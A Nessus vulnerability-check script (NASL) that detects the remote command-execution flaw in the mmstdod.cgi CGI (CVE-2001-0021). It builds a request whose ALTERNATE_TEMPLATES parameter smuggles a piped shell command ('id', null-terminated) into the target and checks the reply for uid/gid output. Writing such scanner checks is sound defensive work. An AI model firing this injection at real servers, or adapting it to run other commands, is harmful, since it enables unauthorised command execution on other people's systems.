#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

 desc = "The 'mmstdod.cgi' cgi is installed. This CGI has
a well known security flaw that lets anyone execute arbitrary
commands with the privileges of the http daemon (root or nobody).

Solution : Delete the file or upgrade to version 3.0.26

Risk factor : High";


if(description)
{
 script_id(10566);
 script_bugtraq_id(2063);
 script_cve_id("CVE-2001-0021");
 script_version ("$Revision: 1.15 $");

 name["english"] = "mmstdod.cgi";
 script_name(english:name["english"]);
 
 script_description(english:desc);
 
 summary["english"] = "Checks for the presence of /cgi-bin/mmstdod.cgi";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");


req = "/mmstdod.cgi?ALTERNATE_TEMPLATES=|%20echo%20" + raw_string(0x22) + 
 			         "Content-Type:%20text%2Fhtml" + raw_string(0x22) +
				 "%3Becho%20" +
				 raw_string(0x22, 0x22) +
				 "%20%3B%20id%00";

http_check_remote_code (
			check_request:req,
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			description:desc
			);
